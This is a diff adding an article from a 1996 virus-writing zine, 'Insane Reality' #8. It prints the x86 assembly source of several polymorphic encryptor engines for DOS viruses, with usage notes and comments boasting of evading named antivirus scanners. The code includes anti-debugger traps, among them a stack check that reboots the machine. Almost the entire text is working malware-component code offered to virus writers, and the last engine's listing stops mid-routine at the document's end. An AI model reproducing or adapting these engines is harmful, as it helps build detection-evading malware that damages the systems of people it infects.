@@ -1,0 +1,1603 @@
+Insane Reality issue #8 - (c)opyright 1996 Immortal Riot/Genesis - REALITY.025
+
+Article: Polymorphic Engines
+Author: Case [IRG]
+
+% Polymorphic Engines by Case [IRG] %
+_____________________________________
+
+What follows is the source to 3 polymorphic engines by Case. Case is a cool
+guy from the U.S., and a member of IRG whose primary interest in viruses is
+polymorphy. He was originally going to release the source to an excellent 
+polymorphic and anti-bait virus, but decided this would make life to easy for
+the AV.  This will hopefully appear in IR#9 instead, after the AV have worked 
+for their money. He gave me these engines to include instead, which are quite 
+old and do not in anyway demonstrate his full potential or talent.
+
+- _Sepultura_
+
+;=[BEGIN CL5.INC]============================================================
+
+; Cryptgen LITE, Version 5.8883.19 ZXr47.3 (again)
+
+; call it CL5 if you want
+
+; Current Scanners
+; TBScan, AVP and SSC don't decrypt files that have been encrypted with this
+; The emulation in TBScan and AVP is good enough to simulate the code and
+; decrypt it, but they both stop when they find my many ints.
+; SSC's generic decryptor can't decrypt this encryption.
+; usually if SSC flags, it will be 'PV' (enough to get 50%, and an alert box)
+; IVX correlates between 0 and 40% of samples (that's not very good)
+
+; One in a million
+; occasionally, AVP will decrypt one (not enough ints)
+; very rarely, SSC will flag at an 'infected' level (weak encryption)
+; TBScan never flags more than 'U1' -- both from the encrypted code
+
+; Detection
+; because of the way decryptors start (doing a DOS version check, complete
+; with termination), and because the encryption algorithim used is
+; cryptanalytically difficult (I think...) I don't think the AVers will
+; detect this one very quickly.  However, simple detection could probably be
+; based on instructions it doesn't make (then false alarms and scanning speed
+; become problems).  I really don't know how polymorphic this is because I've
+; never written a detector before...  I imagine that it's not that strong.
+
+; Summary
+; can't use a scan string (many small scan strings might work...)
+; probably can't use heuristics (too slow/false alarms)
+; probably can't use cryptanalysis (xor/add/xor encryption)
+; algorithmic detection shouldn't be all that difficult
+
+; Stuff it does
+; it makes a few anti-tracing, anti-debuging traps (armor level: none to weak)
+; it can make decryptors that use a counter register or ones that compare the
+;       value of the pointer to determine when the loop should terminate.
+; it can use just about any register for the counter (can't use SP).
+; the encryption it makes is like this: xor, add/sub/rol, xor, add/sub/rol, etc
+; it can make jz/jnz/jae/jbe/ja/jb/jmp/ret/jmp reg to loop
+; it can make inc ptr/scasb/lodsb/cmpsb to increment the pointer
+; it sets up the registers in a random order
+; garbage can be turned off (for poly in memory!), just do mov [garbage],-1
+;       before calling the engine.
+
+; Stuff it doesn't
+; it doesn't make mov [1234],xxx
+; it doesn't make mov xxx,[1234]
+; it doesn't make many calls (it can make one, in the antidebugger stuff)
+; there's lots of opcodes it doesn't make: xlat, xchg, mul, lock, clts...
+
+; Other notes
+; it can be adapted to slow poly... although there aren't many structural
+; things that are really well suited for this, it would probably be better
+; to initialize the rng once at load time or something
+
+; Size
+; it's 1381 bytes long (slightly smaller than one of Lapse's new viruses :)
+; Dark Angel helped/showed me how to remove a ton of bytes :)
+; the maximum length of the generated decryptors is B7h bytes
+
+; Why?
+; the only reason I wrote it is because I was bored with my _big_ engine :P
+; and because I wanted some experience doing DSCE style stuff... I didn't
+; get around to that though
+
+; Usage
+;       mov     [execofs],100           ; use the actual execute offset
+;       mov     [count],cryptlen        ; number of bytes to encrypt
+;       mov     di,offset codebuf       ; where to put the decryptor (duh)
+;       call    poly
+
+; on return:
+; [polylen] = length of generated code
+
+; to encrypt:
+;       mov     cx,cryptlen
+;encnextbyte:
+;       call    encryptor               ; encrypts the byte at bx
+;       inc     bx
+;       loop    encnextbyte
+
+; to include it (masm mode):
+; ideal
+; include cl5.inc
+; masm
+
+; to include it (ideal mode):
+; include "cl5.inc"
+
+; Disclaimer
+; I assume no responsibility for anything
+; If you use it in a program, I'd like to hear about it ;)
+
+	P286		; the 286 code is all in the debugger traps
+
+mincryptops = 5 	; change these to suit your mood
+maxcryptops = 9
+
+encryptorlen = (maxcryptops * 3) + 3
+
+initengine:
+	cld
+	push	di
+	mov	si,offset garbageints
+mark_unused:
+	lodsb
+	or	al,al		; zero marks the last one
+	jz	mark_done
+	lodsb			; get length
+	cbw
+	and	[word si],not Used
+	cmpsw			; add si,2
+	add	si,ax		; point to the next one
+	jmp	mark_unused
+mark_done:
+        mov     di,offset encryptor
+	mov	al,90
+	mov	cx,encryptorlen
+	rep	stosb
+        mov     bp,di
+	pop	di
+
+	mov	[patch],offset patch
+
+	mov	[polylen],di
+	xor	ax,ax
+        mov     [word setup],ax
+	cmp	[garbage],-1
+	jz	dontchangeit
+	mov	[garbage],al
+dontchangeit:
+
+	mov	[status],SPreg+BXreg+CXreg+DSreg
+
+	mov	ax,3000
+	call	getrnd
+	add	ax,6000
+	mov	[intprob],ax
+
+	call	getrndmax
+	mov	[cryptop],al		; start with a xor or an add/sub
+        ret
+
+poly:
+        call    initengine
+	call	gensetup
+	push	[intprob]
+	mov	[intprob],0F000
+        call    gengarbage
+        call    gengarbage
+
+	mov	[loophere],di		; this assures that AVP won't detect us
+        call    gengarbage
+        call    gengarbage
+	pop	[intprob]
+
+	mov	ax,maxcryptops-mincryptops
+	call	getrnd
+	mov	cx,mincryptops
+	add	cx,ax
+makecryptops:
+        call    gengarbage
+	call	gencryptop
+        call    gengarbage
+	loop	makecryptops
+
+	call	genincptr
+        call    gengarbage
+	call	genloop
+        call    gengarbage
+
+shutdown:
+	mov	ax,[polylen]
+	xchg	di,ax
+	sub	ax,di
+	mov	[polylen],ax
+
+	mov	bx,[ptrofs]
+	add	[bx],ax
+	mov	bx,[patch]
+	add	[bx],ax
+retkludge:
+	ret
+
+dsdone	  = 1
+ptrdone   = 2
+ctrdone   = 4
+
+useptr	  = 0
+useincctr = 1
+usedecctr = 2
+
+gensetup:
+	cmp	[setup],dsdone+ptrdone+ctrdone
+	jz	retkludge
+
+	call	choose
+setuptable:
+	db	20d
+	dw	offset ptrisctr
+	db	20d
+	dw	offset setupds
+	db	20d
+	dw	offset geninitptr
+	db	20d
+	dw	offset geninitctr
+	db	20d
+	dw	offset setupgarbage
+
+setupgarbage:
+        call    gengarbage
+	jmp	gensetup
+
+ptrisctr:
+	test	[setup],ctrdone
+	jnz	gensetup
+	or	[setup],ctrdone
+
+	mov	[ctrtype],useptr
+	jmp	gensetup
+
+setupds:
+	test	[setup],dsdone
+	jnz	gensetup
+	or	[setup],dsdone
+
+	mov	ax,1F0E
+        jmp     jmpgensetupkludge
+
+geninitptr:
+	test	[setup],ptrdone
+	jnz	gensetup
+	or	[setup],ptrdone
+
+anotherptr:
+	mov	ax,3
+	call	getrnd
+
+	mov	bx,ax
+	shl	bx,1
+	add	bx,offset reg
+	mov	bx,[bx]
+	test	[status],bx
+	jnz	anotherptr
+	or	[status],bx
+
+	mov	bx,offset ptrregtable
+	add	bx,ax
+	mov	[ptrreg],al
+
+	mov	al,[bx]
+	or	al,0B8
+	stosb
+	mov	ax,[execofs]
+	mov	[ptrofs],di
+jmpgensetupkludge:
+	stosw
+jmpgensetupkludge2:
+        jmp     gensetup
+
+geninitctr:
+	test	[setup],ctrdone
+        jnz     jmpgensetupkludge2
+	or	[setup],ctrdone
+
+differentreg:
+	call	getreg
+
+	test	bx,AXreg+SIreg		; don't use AX or SI as the counter
+	jnz	differentreg
+	or	[status],bx
+
+	mov	[ctrreg],al
+
+	or	al,0B8
+	stosb
+	call	getrndmax
+	mov	[fuxcount],ax
+
+	push	ax
+	call	getrndmax
+	test	al,40
+	pop	ax
+	jz	decctr
+; inc ctr
+	mov	[ctrtype],useincctr
+	sub	ax,[count]
+	jmp	storeit
+decctr:
+	mov	[ctrtype],usedecctr
+	add	ax,[count]
+storeit:
+	mov	bx,[count]
+
+	cmp	bx,ax
+	jb	yukctrcarry
+
+	add	bx,ax
+	jnb	noctrcarry
+yukctrcarry:
+	inc	[ctrcarry]
+noctrcarry:
+	jmp	jmpgensetupkludge
+
+; make add/sub/rol, xor
+gencryptop:
+	sub	bp,3
+	mov	bx,offset rm
+	add	bl,[ptrreg]
+	mov	bl,[bx]
+
+	inc	[cryptop]		; this makes sure that xor, xor never
+	test	[cryptop],1		; happens... it's always xor, type2
+	jz	type2
+; xor
+	mov	ax,3080
+	or	ah,bl
+	stosw
+
+	mov	[word es:bp],3780
+	jmp	rndbyte
+
+type2:
+	call	choose
+type2table:
+	db	45d
+	dw	offset cryptsub
+	db	45d
+	dw	offset cryptadd
+	db	10d
+	dw	offset cryptrol
+
+cryptrol:
+	mov	ax,00D0
+	mov	dh,0F
+
+storestuff:
+	mov	dl,al
+	or	ah,bl
+	stosw
+	mov	[word es:bp],dx
+	ret
+
+cryptsub:
+	mov	ax,2880
+	mov	dh,07
+	jmp	finish
+
+cryptadd:
+	mov	ax,0080
+	mov	dh,2F
+finish:
+	call	storestuff
+rndbyte:
+	call	getrndmax
+	stosb
+	mov	[byte es:bp+2],al
+	ret
+
+; make inc ptr
+genincptr:
+	cmp	[ptrreg],0
+	jz	siptr
+	cmp	[ptrreg],1
+	jnz	bxptr
+
+diptr:			; scasb, cmpsb, inc di
+	call	choose
+incditable:
+	db	30d
+	dw	offset genscasb
+	db	30d
+	dw	offset gencmpsb
+	db	40d
+	dw	offset incdi
+
+siptr:			; lodsb, cmpsb, inc si
+	call	choose
+incsitable:
+	db	30d
+	dw	offset genlodsb
+	db	30d
+	dw	offset gencmpsb
+	db	40d
+	dw	offset incsi
+
+bxptr:
+	mov	al,43
+	db	3Dh
+
+gencmpsb:
+	mov	al,0A6
+	db	3Dh
+
+genlodsb:
+	mov	al,0AC
+	db	3Dh
+
+genscasb:
+	mov	al,0AE
+	db	3Dh
+incdi:
+	mov	al,47
+	db	3Dh
+
+incsi:
+	mov	al,46
+	stosb
+	ret
+
+gencmpptr:			; make cmp ptr,[count]
+	mov	bx,offset ptrregtable
+	add	bl,[ptrreg]
+	mov	bl,[bx]
+
+	mov	ax,0F881
+	or	ah,bl
+	stosw
+	mov	[patch],di		; add polylen later
+	mov	ax,[count]
+	add	ax,[execofs]
+	stosw
+	jmp	makeloop
+
+; make:
+; inc/dec ctr
+; cmp ctr,[fuxcount]
+; jnz [loophere]
+genloop:
+	mov	bl,[ctrreg]
+	cmp	[ctrtype],useptr
+	jz	gencmpptr
+	cmp	[ctrtype],useincctr
+	jz	genincctr
+
+gendecctr:
+	mov	al,48
+	db	3Dh
+
+genincctr:
+	mov	al,40
+	or	al,bl
+	stosb
+	or	bl,bl		; if reg is ax
+	jz	cmpacc
+
+	mov	ax,0F881
+	or	ah,bl
+	stosw
+	jmp	calcdone
+
+cmpacc:
+	mov	al,3Dh
+	stosb
+calcdone:
+	mov	ax,[fuxcount]
+	cmp	[ctrtype],useincctr
+	jz	addcount
+subcount:
+	sub	ax,[count]
+	jmp	storecount
+addcount:
+	add	ax,[count]
+storecount:
+	stosw
+
+makeloop:
+	call	choose
+looptable:
+	db	25d
+	dw	offset jnzloop
+	db	25d
+	dw	offset jzjmploop
+	db	25d
+	dw	offset jajbloop
+	db	25d
+	dw	offset jajbjmploop
+
+jajbloop:
+; ja loophere	; if ctrtype = usedecctr
+; jb loophere	; if ctrtype = useincctr
+        cmp     [ctrcarry],0
+        jnz     jnzloop
+
+	cmp	[ctrtype],usedecctr
+	jz	makeja
+	mov	al,72
+	db	03Dh
+makeja:
+	mov	al,77
+	db	03Dh
+jmps:
+	mov	al,0EBh
+	db	03Dh
+jnzloop:
+; jnz loophere
+	mov	al,75
+	stosb
+	mov	ax,[loophere]
+	mov	bx,di
+	sub	ax,bx
+	dec	ax
+	stosb
+	ret
+
+jajbjmploop:
+; jbe crud	; if ctrtype = usedecctr
+; jmp loophere
+
+; jae crud	; if ctrtype = useincctr
+; jmp loophere
+        cmp     [ctrcarry],0
+        jnz     jzjmploop
+
+	cmp	[ctrtype],usedecctr
+	jz	makejbe
+	mov	al,73
+	db	03Dh
+makejbe:
+	mov	al,76
+	db	03Dh
+
+jzjmploop:
+; jz crud
+; jmp loophere
+	mov	al,74			; jz
+	mov	dx,di			; save 'ip'
+	stosb
+	stosb				; reserve the offset
+	call	makejmp 		; jmp loophere
+	mov	ax,di
+	sub	ax,dx
+	mov	bx,dx
+	dec	ax
+	dec	ax
+	mov	[es:bx+1],al
+	ret
+
+; creates an unconditional jump to loophere
+makejmp:
+	call	choose
+jumpstable:
+	db	40d
+	dw	offset jmps
+	db	30d
+	dw	offset jmpreg
+	db	30d
+	dw	offset pushret
+
+jmpreg:
+	call	movregloophere
+	xchg	ah,al
+	or	ax,0E0FF
+	stosw
+	ret
+
+movregloophere:
+	call	getreg
+	mov	bx,[loophere]
+	sub	bx,[polylen]
+	add	bx,[execofs]
+	call	genmov
+	ret
+
+pushret:
+	call	movregloophere
+	or	al,50		; push reg
+	stosb
+	mov	al,0C3		; ret
+	stosb
+	ret
+
+genmov:
+	push	ax
+	or	al,0B8
+	stosb
+	xchg	bx,ax
+	stosw
+	pop	ax
+	ret
+
+getreg:
+	call	getrnd7
+	mov	bx,ax
+	shl	bx,1
+	add	bx,offset tostatus
+	mov	bx,[bx]
+	test	[status],bx
+	jnz	getreg
+	ret
+
+;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+gengarbage:
+	cmp	[garbage],-1
+	jz	nogarbage
+
+	inc	[garbage]
+	cmp	[garbage],2
+	jb	fakegetversion
+
+	call	getrndmax
+	cmp	ax,[intprob]
+        ja      exitgarbage
+
+	mov	si,offset garbageints
+	call	get_table_entry
+exitgarbage:
+        ret
+
+; stops tbscan, avp and ssc
+fakegetversion:
+        call    getrndmax               ; 1 in 8 chance of no get version
+        test    al,45
+        jz      nogarbage
+
+	mov	ax,3
+	call	getrnd			; between 1 and 3
+	inc	al
+	mov	[dosvers],al
+
+	call	getrndmax		; random errorlevel
+	mov	[errlvl],al
+
+	mov	si,offset getversion
+	mov	cx,offset dontquit-offset getversion
+	rep	movsb
+
+nogarbage:
+	xor	[status],BXreg+CXreg
+	ret
+
+getversion:
+	mov	ah,30
+	int	21
+	cmp	al,3
+	org	$-1
+dosvers db	3
+	jnb	dontquit
+	db	0B8		; mov ax,4C??
+errlvl	db	1
+	db	4C
+	int	21
+dontquit:
+
+get_table_entry:
+	push	ax cx
+
+	call	getrnd100
+
+	xchg	ah,al
+get_entry:
+	lodsb			; probability
+
+	or	al,al
+	jz	no_entry
+
+	test	[word si+1],Used
+	jnz	eeets_Used
+
+	sub	ah,al
+	jb	got_entry
+
+eeets_Used:
+	push	ax
+	lodsb			; length
+	cbw
+				; regs to save
+	inc	si
+	inc	si
+	add	si,ax		; code
+	pop	ax
+	jmp	get_entry
+
+got_entry:
+
+	lodsb			; length
+	cbw
+	mov	cx,ax
+
+	or	[word si],Used
+
+	lodsw			; registers to save
+	call	preserveregs
+	rep	movsb		; copy it
+	call	popregs
+no_entry:
+
+	pop	cx ax
+	ret
+
+preservetable:
+	push	ax
+	push	cx
+	push	dx
+	push	bx
+	push	sp
+	push	bp
+	push	si
+	push	di
+	push	ds
+	push	es
+
+restoretable:
+	pop	ax
+	pop	cx
+	pop	dx
+	pop	bx
+	pop	sp
+	pop	bp
+	pop	si
+	pop	di
+	pop	ds
+	pop	es
+
+; ax = regs to save
+
+popregs:
+	push	ax si cx
+	mov	si,offset restoretable-1
+	mov	cx,9
+	and	ax,[status]
+restorenext:
+	test	ah,1
+	jz	checkmore2
+	push	si
+	add	si,cx
+	movsb
+	pop	si
+checkmore2:
+
+	dec	cx
+	or	cx,cx
+	jz	pushpopdone
+
+	shl	ax,1
+	jnz	restorenext
+	jmp	pushpopdone
+
+preserveregs:
+	push	ax si cx
+	mov	si,offset preservetable
+	xor	cx,cx
+	and	ax,[status]
+preservenext:
+	test	al,1
+	jz	checkmore
+	push	si
+	add	si,cx
+	movsb
+	pop	si
+checkmore:
+	inc	cx
+	cmp	cx,9
+	jz	pushpopdone
+	shr	ax,1
+	jnz	preservenext
+pushpopdone:
+	pop	cx si ax
+	ret
+
+;31 19 14 13 10 6 5 5 5 4 4
+
+garbageints:
+	db	8		; 8
+	db	5
+	dw	AXreg+DXreg
+	mov	ax,3305h	; get startup drive
+	int	21		; returns values in dl
+
+	db	8		; 16
+	db	4
+	dw	AXreg
+	mov	ah,54		; get verify setting
+	int	21		; return al
+
+	db	8		; 24
+	db	5
+	dw	AXreg+DXreg
+	mov	ax,3300 	; get ctrl-break checking flag
+	int	21		; return dl
+
+	db	8		; 32
+	db	4
+	dw	AXreg+BXreg
+	mov	ah,0Fh		; get current video mode
+	int	10h		; returns in ax and bx
+
+	db	8		; 40
+	db	6
+	dw	AXreg+BXreg+CXreg+DXreg
+	mov	ah,3		; get cursor position and size
+	xor	bx,bx
+	int	10
+
+	db	5d		; 50
+	db	14d
+	dw	CXreg
+	push	ax		; Natas/TBDriver style stack check
+	pop	ax
+	dec	sp
+	dec	sp
+	pop	cx
+	cmp	ax,cx
+	jz	stackok
+	push	-1		; reboot
+	push	0
+	retf
+stackok:
+
+	db	1		; 51
+	db	1
+	dw	0
+	db	0F1		; bpice :) thanks Antigen :)
+
+	db	4
+	db	31d
+	dw	0
+	call	messitup		; 3
+	jnc	donemessingthingsup	; 2
+	xor	[byte bx],5A		; 3
+	db	0EA			; 1
+	xor	[byte bx],91		; 3
+	db	?			; 1
+	db	09A			; 1
+	db	?			; 1
+messitup:
+	push	bp			; 1
+	mov	bp,sp			; 2
+	cli				; 1
+	mov	sp,[bp+2]	; sp=ip ; 3
+	add	sp,0A			; 3
+	db	0F1	; bpice
+	mov	sp,bp			; 2
+	pop	bp			; 1
+	clc				; 1
+	ret				; 1
+donemessingthingsup:
+
+	db	5d		; 60
+	db	10d
+	dw	AXreg+DXreg	; kill int 1
+	cli
+	mov	dx,ss
+	xor	ax,ax
+	mov	ss,ax
+	int	3
+	mov	ss,dx
+
+	db	5d		; 65
+	db	19d
+	dw	AXreg+BXreg
+	cli
+	push	ds
+	push	ss		; kill int 1 another way
+	xor	bx,bx
+	mov	ds,bx
+	mov	ax,[ds:bx+4]
+	pop	ss
+	mov	[ds:bx+4],bx
+	int	3
+	mov	[ds:bx+4],ax
+	pop	ds
+
+	db	10d		; 70
+	db	5
+	dw	AXreg
+	mov	ax,0400 	; "be quiet!" turn kb click off
+	int	16h		; no return
+
+	db	10d		; 80
+	db	4
+	dw	AXreg
+	mov	ah,2		; get shift status/read keyboard flags
+	int	16h		; return al
+
+	db	10d		; 90
+	db	4
+	dw	AXreg
+	mov	ah,1		; get keyboard status
+	int	16		; return ax
+
+	db	10d		; 100
+	db	4
+	dw	AXreg
+	mov	ah,11		; get extended keyboard status
+	int	16h		; return ax
+
+	db	0		; mark the end
+
+;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+; destroys ax and si, they must be saved by the parent procedure
+; total probability must equal 100d or it might (probably! will) crash.
+choose:
+	pop	si
+	call	getrnd100      ; range 0 - 99d
+	xchg	ah,al
+get_routine:
+	lodsb
+	sub	ah,al
+        jb      got_routine
+	inc	si
+	inc	si
+        jmp     get_routine
+
+got_routine:
+	lodsw
+	jmp	ax
+
+;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+include "getrnd.inc"
+;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+encryptor:
+	db	encryptorlen dup(90)
+	ret
+
+;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+;	7654321076543210
+AXreg = 0000000000000001b
+CXreg = 0000000000000010b
+DXreg = 0000000000000100b
+BXreg = 0000000000001000b	; pointer reg
+SPreg = 0000000000010000b
+BPreg = 0000000000100000b
+SIreg = 0000000001000000b	; pointer reg
+DIreg = 0000000010000000b	; pointer reg
+DSreg = 0000000100000000b
+ESreg = 0000001000000000b
+Used  = 0000010000000000b	; marks garbage as used or not
+
+tostatus:		; for converting a register number to it's status bit
+	dw	AXreg
+	dw	CXreg
+	dw	DXreg
+	dw	BXreg
+	dw	SPreg
+	dw	BPreg
+	dw	SIreg
+	dw	DIreg
+	dw	DSreg
+	dw	ESreg
+
+reg:			; for converting a number from 0 to 2 to a status bit
+	dw	SIreg
+	dw	DIreg
+	dw	BXreg
+
+ptrregtable:
+	db	110b	; si
+	db	111b	; di
+	db	011b	; bx
+
+rm:
+	db	100b  ; [si]
+	db	101b  ; [di]
+	db	111b  ; [bx]
+
+; this stuff really should be put somewhere else...
+intprob dw	?
+garbage db	?
+cryptop db	?
+
+polylen dw	?
+loophere dw	?
+
+execofs dw	?
+fuxcount dw	?
+count	dw	?
+status	dw	?
+
+setup   db      ?
+ctrcarry db     ?
+
+ptrofs	dw	?
+patch	dw	?
+
+ptrreg	db	?
+ctrreg	db	?
+ctrtype db	?
+
+
+; this engine was written to run on Energizer batteries
+
+;=[END CL5.INC]==============================================================
+
+
+
+;=[BEGIN GETRND.INC]=========================================================
+
+getrndmax:
+        mov     ax,-1
+        jmp     getrnd
+
+getrnd7:
+	mov	ax,0111b
+        jmp     getrnd
+
+getrnd100:
+	mov	ax,100d
+
+; nicked w/o permission from level3
+getrnd:
+	push	si
+	push	dx
+	push	bx
+	push	cx
+	push	ax
+	db	0b9h	; mov	cx,???
+rnd2:	dw	?
+	db	0bbh	; mov	bx,???
+rnd1:	dw	?
+	mov	dx,015ah
+	mov	ax,4e35h
+	xchg	ax,si
+	xchg	ax,dx
+	test	ax,ax
+	jz	rnd_l1
+	mul	bx
+rnd_l1: jcxz	rnd_l2
+	xchg	ax,cx
+	mul	si
+	add	ax,cx
+rnd_l2: xchg	ax,si
+	mul	bx
+	add	dx,si
+	inc	ax
+	adc	dx,0000h
+	mov	[word cs:rnd1],ax
+	mov	[word cs:rnd2],dx
+	mov	ax,dx
+	pop	cx
+	xor	dx,dx
+	jcxz	rdbz		;division by zero
+	div	cx
+	jmp	short danilak_vyskumnik
+rdbz:	;xchg	 dx,ax		 ;if ax=0 on input then interval 0-ffff
+danilak_vyskumnik:
+	xchg	dx,ax
+	pop	cx
+	pop	bx
+	pop	dx
+	pop	si
+	ret
+
+;=[END GETRND.INC]===========================================================
+
+
+
+;=[BEGIN POLY2.INC]==========================================================
+
+; I wanted to see how big this code would be without the DSCE shit
+; 227 bytes
+
+; decryptors look like:
+; mov ptr,imm
+; loophere:
+; xor/sub/add [ptr],imm
+; xor/sub/add [ptr],imm
+; xor/sub/add [ptr],imm
+; xor/sub/add [ptr],imm
+; xor/sub/add [ptr],imm
+; inc ptr
+; inc ptr
+; jb loophere
+
+; it never generates either all xors or all adds & subs... therefore, xray
+; doesn't work against it, but...
+; signature scanning with some wildcards should be pretty easy
+
+maxcryptops = 9
+mincryptops = 3
+maxcryptlen = maxcryptops * 4
+
+poly:
+        push    cx                      ; save count
+        push    si                      ; save execofs
+        push    di                      ; save original di
+
+        push    di
+        mov     di,offset encryptor
+        mov     al,90
+        mov     cx,maxcryptlen
+        rep     stosb
+        mov     bp,di
+        pop     di
+
+        mov     ax,maxcryptops-mincryptops
+        call    getrnd
+        mov     cl,mincryptops
+        add     cl,al
+        in      al,40
+        xchg    dx,ax                   ; dx is pattern
+
+        mov     si,offset ptrtable
+        mov     ax,3
+        call    getrnd
+        shl     ax,1
+        add     si,ax
+        lodsw
+        mov     bx,ax
+        or      al,0B8          ; mov ptr,imm
+        stosb
+        push    di                      ; save ptrofs
+        stosw                   ; reserve space
+
+        push    di                      ; save loophere
+
+garbage:
+; I haven't thought of a way to make garbage that's realistic without all the
+; register tracking stuff... in other words, it's either shitty garbage that
+; scanners ignore, or it will take me a few hundred bytes
+
+cryptop:
+        sub     bp,4
+        mov     al,81
+        mov     [bp],al
+        stosb
+
+        mov     si,offset optable
+        mov     ax,2
+        call    getrnd
+        inc     ax                      ; not an xor
+        inc     dx                      ; dx is pattern
+        test    dx,1
+        jz      randomop
+        xor     ax,ax                   ; make an xor
+randomop:
+        shl     ax,1
+        add     si,ax
+        lodsw
+        mov     [bp+1],ah
+        or      al,bh
+        stosb
+        mov     ax,-1
+        call    getrnd
+        mov     [bp+2],ax
+        stosw
+; end cryptop
+
+        loop    garbage
+
+        mov     al,40           ; inc ptr
+        or      al,bl
+        stosb
+        stosb
+
+        mov     ax,0F881        ; cmp ptr,imm
+        or      ah,bl
+        stosw
+        mov     dx,di                   ; dx=patchofs
+        stosw                   ; reserve space
+
+        pop     ax                      ; ax=loophere
+        sub     ax,di
+        dec     ax
+        dec     ax
+        mov     ah,al
+        mov     al,72
+        stosw
+
+        pop     bx                      ; get ptrofs back
+        pop     ax                      ; get original di back
+        pop     si                      ; get execofs back
+        pop     cx                      ; get count back
+
+        push    di
+        sub     di,ax                   ; calculate polylen
+        xchg    di,ax
+        push    ax
+
+        mov     di,bx                   ; patch mov ptr,initptr
+        add     ax,si                   ; ax=execofs+polylen
+        stosw
+        mov     di,dx                   ; patch cmp ptr,initptr+count
+        add     ax,cx                   ; ax=execofs+polylen+count
+        stosw
+        pop     ax                      ; ax=polylen
+
+        pop     di
+        ret
+
+getrnd:
+        push    cx dx
+        push    ax
+        in      al,40
+        mov     cl,0
+        org     $-1
+seed    db      0
+        mov     ah,al
+        xor     ax,dx
+        xchg    [seed],al
+        rol     ax,cl
+
+        pop     cx
+        xor     dx,dx
+        jcxz    divzero
+        div     cx
+divzero:
+        xchg    dx,ax
+        pop     dx cx
+	ret
+
+encryptor:
+        db      maxcryptlen dup(90)
+        ret
+
+optable:
+        db      30      ; xor [],1234                   ; op
+        db      37      ; xor [bx],1234                 ; inverse op
+        db      0       ; add [],1234
+        db      2F      ; sub [bx],1234
+        db      28      ; sub [],1234
+        db      7       ; add [bx],1234
+
+ptrtable:
+        db      110b            ; si
+        db      100b            ; [si]
+        db      111b            ; di
+        db      101b            ; [di]
+        db      011b            ; bx
+        db      111b            ; [bx]
+
+;=[END POLY2.INC]============================================================
+
+
+
+;=[BEGIN POLY3.INC]==========================================================
+
+; Idea:
+; I want to make some DSCE style shit!!!
+
+; This engine is good against heuristics and X-Ray, but a dedicated detector
+; should be _very_ easy to write.
+
+; 598 bytes
+
+; some innocent looking garbage ints, some debugger traps :)
+
+; f-prot /analyse thinks something's up (/paranoid doesn't for some reason...)
+; tbscan/avp/ssc see nothing :)
+; ivx correlates 100%
+
+; decryptor layout:
+; mov ah,30                     <- constant code
+; cmp al,3                      <
+; jb dontquit                   <
+; mov ah,4C                     <
+; int 21                        <
+; dontquit:
+; garbage (random int or debugger trap)
+; mov [mem],imm
+; ...
+; xor cx,cx                     <
+; jcxz $+2                      <
+; mov ah,4C                     <- this is overwritten by the real decryptor
+; int 21                        <
+;
+; the real decryptor looks like:
+; mov ptr,imm
+; nextword:
+; xor [ptr],imm
+; sub/add [ptr],imm
+; ...
+; inc ptr
+; inc ptr
+; cmp ptr,imm
+; jb nextword
+
+; the pointer is random, as well as the en/decryption algorithim
+
+mincryptops = 3
+maxcryptops = 9
+maxenclen = maxcryptops * 4
+
+poly:
+        cld
+        mov     [polylen],di
+        mov     [patch],si
+        push    si
+
+        push    di
+        mov     di,offset encryptor
+        mov     al,90
+        mov     cx,maxenclen
+        mov     bp,di                   ; bp=offset encryptor+maxenclen
+        add     bp,cx
+        rep     stosb
+
+        inc     di                      ; point to the decryptor
+        push    di
+
+; init pointer
+        mov     si,offset ptrtable
+        mov     ax,3
+        call    getrnd
+        shl     ax,1
+        add     si,ax
+
+        lodsw                   ; al = pointer reg, ah = address mode
+        mov     bx,ax
+        or      al,0B8          ; mov reg,1234
+        stosb
+        mov     [initptr],di
+        scasw                   ; reserve space
+
+        mov     [loophere],di
+        mov     ax,maxcryptops-mincryptops
+        call    getrnd
+        mov     cx,mincryptops
+        add     cx,ax
+morecryptops:
+cryptop:
+        inc     [pattern]
+        sub     bp,4
+        mov     al,81
+        stosb
+        mov     [es:bp],al
+
+        xor     ax,ax
+        mov     si,offset crypttable
+        test    [pattern],1
+        jnz     makexor
+        mov     al,2
+        call    getrnd
+        inc     ax
+makexor:
+        shl     ax,1
+        add     si,ax
+        lodsw
+
+        mov     [es:bp+1],ah
+        or      al,bh
+        stosb
+
+        mov     ax,-1
+        call    getrnd          ; imm
+        stosw
+        mov     [es:bp+2],ax
+; end cryptop
+
+        loop    morecryptops
+
+        mov     al,40           ; inc ptr
+        or      al,bl
+        stosb
+        stosb
+
+        mov     ax,0F881        ; cmp ptr,ptrdone
+        or      ah,bl
+        stosw
+        mov     [decdone],di
+        scasw
+
+        mov     al,72           ; jb loophere
+        stosb
+
+        mov     ax,[loophere]
+        sub     ax,di
+        dec     al
+        stosb
+        mov     al,90
+        stosb
+        pop     ax
+        xchg    ax,di           ; calculate the decryptor length
+        sub     ax,di
+        mov     [declen],ax     
+
+        pop     di
+
+        mov     si,offset getversion
+        mov     cx,offset goodversion-offset getversion
+        rep     movsb
+
+        mov     cx,ax           ; cx=decryptor length in words
+        shr     cx,1
+        push    cx
+
+        mov     bp,6
+makemovs:
+
+gengarbage:
+;        jmp     nogarbage
+        push    cx
+        mov     si,offset garbagetable
+        mov     ax,garbagecount
+        call    getrnd
+        mov     cx,ax
+        jcxz    foundit
+findit:
+        lodsb                   ; length
+        add     si,ax
+        loop    findit
+foundit:
+        lodsb
+        xchg    cx,ax
+        rep     movsb
+        pop     cx
+; end gengarbage
+nogarbage:
+
+        push    di
+        mov     ax,[patch]
+        xchg    di,ax
+        stosw                   ; store the patch loc
+        mov     [patch],di
+        pop     di
+
+        add     di,bp           ; reserve space for the mov [mem],imm
+        loop    makemovs
+
